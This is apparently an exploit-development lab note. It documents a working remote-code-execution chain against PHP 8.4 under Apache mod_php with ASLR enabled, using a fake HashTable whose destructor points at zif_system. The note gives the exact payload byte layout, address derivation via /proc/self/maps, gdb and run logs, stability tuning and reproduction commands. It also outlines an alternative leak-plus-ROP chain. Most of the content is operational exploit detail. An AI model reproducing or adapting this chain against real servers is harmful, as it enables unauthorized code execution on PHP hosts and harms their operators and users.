# ASLR-on RCE on 172.16.0.103 — Zend-only chain (`zif_system`)

Date: 2026-10-21
Host: `debian@172.16.0.103` (Debian 12.15, 16 cores, kernel 6.1.0-52)
Apache: 2.4.68 prefork, single worker, `127.0.0.1:8088`
PHP: 8.4.26 self-built, mod_php, same configure flags as NOTES §2.1

## Result

ASLR was left **enabled** (`parent/worker personality=00000000`). A fresh
Apache master was started normally; the exploit executed `id>/tmp/x` 5 times
in a row, each time on a newly forked worker:

```text
PARENT=691337 personality=00000000 WORKER=691339 personality=00000000
RUN 1 OK ... RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

gdb on a fresh ASLR-on worker:

```text
HIT zif_system rdi(execute_data)=0x7f37ef8046e0 rsi(return_value)=0x1
arg1_str=id>/tmp/x
#0 zif_system ...
#1 zend_hash_destroy (ht=0x7f37ef8046c0)
#2 zend_array_destroy
#3 zend_hash_clean (ht=0x7f37ef803150)
#4 zif_session_unset
```

Full log: `logs/g18_aslr_zend_verify.log`.

The fake HashTable's `pDestructor` points at **libphp's `zif_system`**, not at
libc `system`. No libc address appears in the payload or the chain. `zif_system`
internally reaches `php_exec()/popen()`; that is Zend's own implementation.

## Address derivation (`/proc/self/maps`)

The PoC is a PHP page and reads `/proc/self/maps` at runtime:

- `libphp.so` base: start of the `r--p 00000000 ... /libphp.so` mapping.
- Zend MM chunk base: the anonymous `rw-p` mapping that is exactly `0x200000`
  bytes and 2 MB aligned.
- `S = chunk_base + 0x4640` (measured for this self-contained script on this
  build/config).
- `zif_system = libphp_base + 0x43a870`.

Measured on a fresh ASLR-on start:

```text
libbase=0x7f37ede00000 chunkbase=0x7f37ef800000
S=0x7f37ef804640 zif_system=0x7f37ee23a870
```

A second fresh start produced different bases and the same relative offsets,
and the exploit still worked; the script re-reads maps on every request, so it
survives Apache master restarts.

## Zend-only payload (320 bytes reclaiming the freed arData at S)

| offset | content |
|---|---|
| `0x40` | fake `zend_function`: `type=ZEND_INTERNAL_FUNCTION(1)`, `fn_flags=0` |
| `0x60` | fake zval: value=`S+0x80`, type=`IS_ARRAY_EX(0x307)` |
| `0x80` | fake HashTable: refcount=1, type=IS_ARRAY, flags=0x10, mask=0xfffffff8, arData=`S+0xA0`, nNumUsed=nNumOfElements=1 |
| `0xA0` | fake `zend_execute_data` (also fake HT bucket.val) |
| `0xB0` | `execute_data->return_value`, and fake HT `pDestructor = zif_system` |
| `0xB8` | `execute_data->func = S+0x40` |
| `0xCC` | `This.u2.num_args = 1` |
| `0xF0` | arg1 zval: value=`S+0x100`, type=`IS_STRING(6)` |
| `0x100` | fake `zend_string` header (refcount=1, type=0x106, len=9); chars at `0x118` |
| `0x118` | `"id>/tmp/x\0"` |
| `0x138–0x13f` | **unusable**: observed clobbered in this 320-byte bin |

Key detail: `ZEND_CALL_ARG(execute_data, 1) = execute_data + 0x50`
(`sizeof(zend_execute_data) == 0x50`), not `+0x60`. The first attempt placed the
argument at `+0x60`; the string type check failed and no command ran.

## Stability observations

- Fresh worker, first request: A/S chunk offsets are stable across prefork
  respawns under one master (3/3 and 5/5 measurements). Crash → prefork forks a
  new worker with the same mappings and the same request-shaped heap layout.
- A worker that has already served another request can have a different
  layout (observed session-array offset `0x21c0` vs `0x31c0`). The verified
  runs always targeted a fresh worker. For a long-lived worker, re-measure or
  leak the layout for that request history.
- S_OFF is script-shape dependent: the old `tools/d.php` was `0x4500`, the
  self-contained `tools/d_aslr.php` is `0x4640`. Re-measure per script.
- After the command runs, the worker still crashes in
  `zend_hash_destroy`'s final `pefree(HT_GET_DATA_ADDR(fake_ht))`
  (interior pointer). This is expected; the proof is the command side effect.

## Limitation / next step

This line uses `/proc/self/maps`, so it requires the vulnerable application
(our PHP page) to be able to read procfs (no `open_basedir`). It is not yet a
"pure upload_progress / no application cooperation" ASLR bypass.

The concurrent NOTES §10 line solves the same ASLR problem without procfs:
`session.serialize_handler=php_serialize` + `session_encode()` OOB reads leak
the Zend chunk base and a libphp anchor, then a libphp-only ROP (`popen@plt`)
executes the command. That is the stronger, file-read-independent direction;
the Zend-only destination here (`zif_system`, fake execute_data) can be used as
an alternative terminal stage once those two leaks are available.

## Files

- `tools/d_aslr.php` — self-contained ASLR-on PoC (maps leak + `zif_system`).
- `tools/d_aslr_ev.php` — same, plus `/tmp/leak_ev.txt` with leaked bases.
- `tools/mkpayload_zend_103.py` — static Zend-only payload generator.
- `logs/g18_aslr_zend_verify.log` — fresh-start + gdb + 5/5 evidence.
- `logs/g18_ASLR_ZEND_103.md` — this note.

## Reproduce

```bash
sudo apache2ctl -k stop; sudo killall apache2; sleep 1; sudo apache2ctl -k start
sudo cp tools/d_aslr.php /var/www/php-lab/www/d.php
sudo chown www-data:www-data /var/www/php-lab/www/d.php
sudo rm -f /tmp/x
curl -s --max-time 8 http://127.0.0.1:8088/d.php
sudo cat /tmp/x   # uid=33(www-data) ...
```
